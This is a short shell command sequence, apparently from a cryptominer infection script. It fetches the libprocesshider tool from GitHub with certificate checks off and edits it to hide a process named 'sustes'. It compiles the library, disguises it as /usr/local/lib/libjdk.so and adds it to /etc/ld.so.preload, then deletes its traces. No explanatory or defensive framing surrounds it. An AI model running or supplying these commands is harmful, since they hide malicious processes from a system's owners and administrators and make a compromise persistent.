wget --no-check-certificate https://github.com/gianlucaborello/libprocesshider/archive/master.zip -O master.zip && unzip master.zip && rm -f master.zip && cd libprocesshider-master;
sed -i 's/evil_script.py/sustes/' processhider.c
make && mv libprocesshider.so /usr/local/lib/libjdk.so && echo /usr/local/lib/libjdk.so >> /etc/ld.so.preload && cd .. && rm -rf libprocesshider-master